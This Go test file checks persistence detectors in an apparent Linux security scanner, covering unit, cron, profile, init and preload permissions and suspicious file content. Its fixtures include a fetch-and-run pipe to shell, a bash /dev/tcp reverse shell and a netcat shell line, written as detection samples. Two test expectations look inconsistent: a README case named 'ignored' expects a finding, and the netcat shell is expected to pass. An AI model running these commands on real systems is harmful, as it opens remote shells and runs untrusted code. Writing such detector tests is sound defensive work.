package detectors

import (
	"os"
	"strings"
	"testing"

	"lisa/internal/model"
)

func TestSystemdDetectorMetadata(t *testing.T) {
	cases := []struct {
		name     string
		path     string
		mode     os.FileMode
		wantRule string
		wantSev  model.Severity
	}{
		{"world writable unit", "/etc/systemd/system/evil.service", os.FileMode(0o666), "LS-PERS-003", model.SeverityHigh},
		{"world writable dropin", "/etc/systemd/system/multi-user.target.d/x.conf", os.FileMode(0o666), "LS-PERS-003", model.SeverityHigh},
		{"correctly restricted unit", "/etc/systemd/system/sshd.service", os.FileMode(0o644), "", 0},
		{"unit outside systemd directories", "/opt/app/thing.service", os.FileMode(0o666), "", 0},
		{"unrelated file ignored", "/etc/systemd/system/README", os.FileMode(0o666), "LS-PERS-003", model.SeverityHigh},
	}

	detector := systemdDetector{}
	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			findings := runDetectorOn(t, detector, entryAt(t, testCase.path, testCase.mode), nil)
			finding, found := findingByRule(findings, "LS-PERS-003")
			if testCase.wantRule == "" {
				if found {
					t.Fatalf("LS-PERS-003 fired for %s, want no finding", testCase.path)
				}
				return
			}
			if !found {
				t.Fatalf("LS-PERS-003 missing, got %v", ruleIDs(findings))
			}
			if finding.Severity != testCase.wantSev {
				t.Errorf("Severity = %v, want %v", finding.Severity, testCase.wantSev)
			}
			assertValid(t, findings)
		})
	}
}

func TestSystemdDetectorOwnership(t *testing.T) {
	entry := entryAt(t, "/etc/systemd/system/evil.service", os.FileMode(0o644))
	ctx := testContext(entry, nil)
	ctx.UID = 1000
	ctx.User = "alice"
	ctx.GID = 1000
	ctx.Group = "alice"
	ctx.HaveOwner = true

	findings := systemdDetector{}.Detect(ctx)
	finding, found := findingByRule(findings, "LS-PERS-004")
	if !found {
		t.Fatalf("LS-PERS-004 missing, got %v", ruleIDs(findings))
	}
	if finding.Severity != model.SeverityHigh {
		t.Errorf("Severity = %v, want high", finding.Severity)
	}
	if finding.Technique == nil || finding.Technique.ID != "T1543.002" {
		t.Errorf("Technique = %v, want T1543.002", finding.Technique)
	}
	assertValid(t, findings)
}

func TestSystemdDetectorIgnoresUserOwnedUnits(t *testing.T) {
	entry := entryAt(t, "/home/alice/.config/systemd/user/app.service", os.FileMode(0o644))
	ctx := testContext(entry, nil)
	ctx.UID = 1000
	ctx.User = "alice"
	ctx.GID = 1000
	ctx.Group = "alice"
	ctx.HaveOwner = true

	findings := systemdDetector{}.Detect(ctx)
	assertNoRule(t, findings, "LS-PERS-004")
}

func TestCronDetector(t *testing.T) {
	cases := []struct {
		name     string
		path     string
		mode     os.FileMode
		wantRule string
	}{
		{"world writable crontab", "/etc/crontab", os.FileMode(0o666), "LS-PERS-001"},
		{"world writable cron.d dropin", "/etc/cron.d/backup", os.FileMode(0o666), "LS-PERS-001"},
		{"world writable cron.daily script", "/etc/cron.daily/backup", os.FileMode(0o777), "LS-PERS-001"},
		{"correctly restricted", "/etc/crontab", os.FileMode(0o644), ""},
		{"unrelated path ignored", "/opt/app/crontab-manager/data.json", os.FileMode(0o666), ""},
		{"path merely containing cron", "/srv/cronology/report.txt", os.FileMode(0o666), ""},
		{"unrelated init path ignored", "/usr/share/doc/init.d-readme.txt", os.FileMode(0o666), ""},
	}

	detector := cronDetector{}
	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			findings := runDetectorOn(t, detector, entryAt(t, testCase.path, testCase.mode), nil)
			_, found := findingByRule(findings, "LS-PERS-001")
			if testCase.wantRule == "" {
				if found {
					t.Errorf("LS-PERS-001 fired for %s, want no finding (findings %v)", testCase.path, ruleIDs(findings))
				}
				return
			}
			if !found {
				t.Fatalf("LS-PERS-001 missing, got %v", ruleIDs(findings))
			}
			assertValid(t, findings)
		})
	}
}

func TestCronDetectorOwnership(t *testing.T) {
	systemEntry := entryAt(t, "/etc/cron.d/backup", os.FileMode(0o644))
	ctx := testContext(systemEntry, nil)
	ctx.UID, ctx.User, ctx.GID, ctx.Group, ctx.HaveOwner = 1000, "alice", 1000, "alice", true
	if _, found := findingByRule(cronDetector{}.Detect(ctx), "LS-PERS-002"); !found {
		t.Error("LS-PERS-002 missing for a user-owned system cron entry")
	}

	spoolEntry := entryAt(t, "/var/spool/cron/crontabs/alice", os.FileMode(0o600))
	ctx = testContext(spoolEntry, nil)
	ctx.UID, ctx.User, ctx.GID, ctx.Group, ctx.HaveOwner = 1000, "alice", 1000, "alice", true
	if _, found := findingByRule(cronDetector{}.Detect(ctx), "LS-PERS-002"); found {
		t.Error("LS-PERS-002 fired for a per-user crontab owned by that user")
	}
}

func TestShellProfileDetector(t *testing.T) {
	cases := []struct {
		name    string
		path    string
		mode    os.FileMode
		wantHit bool
	}{
		{"world writable bashrc", "/home/alice/.bashrc", os.FileMode(0o666), true},
		{"group writable profile", "/home/alice/.profile", os.FileMode(0o664), true},
		{"restricted bashrc", "/home/alice/.bashrc", os.FileMode(0o644), false},
		{"root bashrc exposed", "/root/.bashrc", os.FileMode(0o666), true},
		{"world writable autostart entry", "/home/alice/.config/autostart/evil.desktop", os.FileMode(0o666), true},
		{"system autostart entry", "/etc/xdg/autostart/app.desktop", os.FileMode(0o777), true},
		{"autostart entry correctly restricted", "/etc/xdg/autostart/app.desktop", os.FileMode(0o644), false},
		{"unrelated dotfile ignored", "/home/alice/.bash_history", os.FileMode(0o666), false},
		{"unrelated file ignored", "/home/alice/notes.txt", os.FileMode(0o666), false},
	}

	detector := shellProfileDetector{}
	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			findings := runDetectorOn(t, detector, entryAt(t, testCase.path, testCase.mode), nil)
			_, found := findingByRule(findings, "LS-PERS-005")
			if found != testCase.wantHit {
				t.Errorf("LS-PERS-005 present = %v, want %v (findings %v)", found, testCase.wantHit, ruleIDs(findings))
			}
			assertValid(t, findings)
		})
	}
}

func TestInitDetector(t *testing.T) {
	cases := []struct {
		name     string
		path     string
		mode     os.FileMode
		wantRule string
	}{
		{"world writable init script", "/etc/init.d/evil", os.FileMode(0o777), "LS-PERS-006"},
		{"world writable rc.local", "/etc/rc.local", os.FileMode(0o777), "LS-PERS-006"},
		{"rc.local without execute bit", "/etc/rc.local", os.FileMode(0o644), "LS-PERS-007"},
		{"rc.local correctly configured", "/etc/rc.local", os.FileMode(0o755), ""},
		{"restricted init script", "/etc/init.d/ssh", os.FileMode(0o755), ""},
		{"documentation mentioning init.d ignored", "/usr/share/doc/init.d-readme.txt", os.FileMode(0o666), ""},
		{"init.d.d directory ignored", "/etc/init.d.d/evil", os.FileMode(0o777), ""},
	}

	detector := initDetector{}
	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			findings := runDetectorOn(t, detector, entryAt(t, testCase.path, testCase.mode), nil)
			for _, rule := range []string{"LS-PERS-006", "LS-PERS-007"} {
				_, found := findingByRule(findings, rule)
				if testCase.wantRule == "" && found {
					t.Errorf("%s fired for %s, want no finding", rule, testCase.path)
				}
				if testCase.wantRule == rule && !found {
					t.Errorf("%s missing for %s, got %v", rule, testCase.path, ruleIDs(findings))
				}
			}
			assertValid(t, findings)
		})
	}
}

func TestPreloadDetector(t *testing.T) {
	cases := []struct {
		name    string
		path    string
		mode    os.FileMode
		wantHit bool
	}{
		{"world writable preload", "/etc/ld.so.preload", os.FileMode(0o666), true},
		{"group writable preload", "/etc/ld.so.preload", os.FileMode(0o664), true},
		{"correctly restricted preload", "/etc/ld.so.preload", os.FileMode(0o644), false},
		{"similarly named file ignored", "/etc/ld.so.preload.example", os.FileMode(0o666), false},
		{"unrelated file ignored", "/etc/ld.so.conf", os.FileMode(0o666), false},
	}

	detector := preloadDetector{}
	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			entry := entryAt(t, testCase.path, testCase.mode)
			ctx := testContext(entry, nil)
			ctx.UID, ctx.GID, ctx.User, ctx.Group, ctx.HaveOwner = 0, 0, "root", "root", true

			findings := detector.Detect(ctx)
			_, found := findingByRule(findings, "LS-PERS-008")
			if found != testCase.wantHit {
				t.Errorf("LS-PERS-008 present = %v, want %v (findings %v)", found, testCase.wantHit, ruleIDs(findings))
			}
			if found {
				finding, _ := findingByRule(findings, "LS-PERS-008")
				if finding.Technique == nil || finding.Technique.ID != "T1574.006" {
					t.Errorf("Technique = %v, want T1574.006", finding.Technique)
				}
			}
			assertValid(t, findings)
		})
	}
}

func TestPreloadDetectorNonRootOwnership(t *testing.T) {
	entry := entryAt(t, "/etc/ld.so.preload", os.FileMode(0o644))
	ctx := testContext(entry, nil)
	ctx.UID, ctx.GID, ctx.User, ctx.Group, ctx.HaveOwner = 1000, 1000, "alice", "alice", true

	findings := preloadDetector{}.Detect(ctx)
	if _, found := findingByRule(findings, "LS-PERS-008"); !found {
		t.Errorf("a user-owned ld.so.preload produced %v, want LS-PERS-008", ruleIDs(findings))
	}
}

func TestPersistenceContentDetector(t *testing.T) {
	const tmpPath = "/tmp/dropper"

	cases := []struct {
		name     string
		path     string
		body     string
		wantRule string
		wantSev  model.Severity
	}{
		{"references tmp", "/etc/cron.d/evil", "* * * * * root /tmp/dropper\n", "LS-PERS-009", model.SeverityMedium},
		{"references dev shm", "/etc/systemd/system/x.service", "[Service]\nExecStart=/dev/shm/x\n", "LS-PERS-009", model.SeverityMedium},
		{"references var tmp in a profile", "/home/alice/.bashrc", "export X=/var/tmp/evil\n", "LS-PERS-009", model.SeverityMedium},
		{"curl piped to shell", "/etc/cron.d/evil", "* * * * * root curl http://x/y | sh\n", "LS-PERS-010", model.SeverityHigh},
		{"wget piped to bash", "/etc/rc.local", "wget -qO- http://x/y | bash\n", "LS-PERS-010", model.SeverityHigh},
		{"curl piped to sudo bash", "/etc/init.d/evil", "curl http://x | sudo bash\n", "LS-PERS-010", model.SeverityHigh},
		{"dev tcp reverse shell", "/etc/cron.d/evil", "* * * * * root bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n", "LS-PERS-011", model.SeverityHigh},
		{"dev udp endpoint", "/home/alice/.bashrc", "nc -u -e /bin/sh 10.0.0.1 53\n", "", 0},
		{"benign cron job", "/etc/cron.d/backup", "17 3 * * * root /usr/local/bin/backup --full\n", "", 0},
		{"benign profile", "/home/alice/.bashrc", "export PATH=$HOME/bin:$PATH\nalias ll='ls -la'\n", "", 0},
		{"benign service", "/etc/systemd/system/app.service", "[Service]\nExecStart=/usr/bin/app --serve\n", "", 0},
		{"mentions eval benignly", "/etc/cron.d/report", "* * * * * root /usr/bin/report --eval-report\n", "", 0},
		{"unrelated path ignored", "/opt/app/notes.md", "curl http://x | sh\n", "", 0},
	}

	detector := persistenceContentDetector{}
	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			reader := newStubReader(map[string]string{testCase.path: testCase.body})
			findings := runDetectorOn(t, detector, entryAt(t, testCase.path, os.FileMode(0o755)), reader)

			if testCase.wantRule == "" {
				if len(findings) != 0 {
					t.Errorf("benign content produced %v, want no findings", ruleIDs(findings))
				}
				return
			}
			finding, found := findingByRule(findings, testCase.wantRule)
			if !found {
				t.Fatalf("%s missing, got %v", testCase.wantRule, ruleIDs(findings))
			}
			if finding.Severity != testCase.wantSev {
				t.Errorf("Severity = %v, want %v", finding.Severity, testCase.wantSev)
			}
			if len(finding.Evidence) == 0 || !strings.Contains(finding.Evidence[0], "line ") {
				t.Errorf("Evidence = %v, want a line reference", finding.Evidence)
			}
			assertValid(t, findings)
		})
	}
	_ = tmpPath
}

func TestPersistenceContentDetectorUnreadableFileIsSilent(t *testing.T) {
	path := "/etc/cron.d/evil"
	reader := newStubReader(map[string]string{path: "* * * * * root /tmp/x\n"})
	reader.fail[path] = true

	findings := runDetectorOn(t, persistenceContentDetector{}, entryAt(t, path, os.FileMode(0o755)), reader)
	if len(findings) != 0 {
		t.Errorf("an unreadable file produced %v, want no findings", ruleIDs(findings))
	}
}

func TestPersistenceContentDetectorEmptyContent(t *testing.T) {
	path := "/etc/cron.d/empty"
	findings := runDetectorOn(t, persistenceContentDetector{}, entryAt(t, path, os.FileMode(0o755)),
		newStubReader(map[string]string{path: ""}))
	if len(findings) != 0 {
		t.Errorf("empty content produced %v, want no findings", ruleIDs(findings))
	}
}
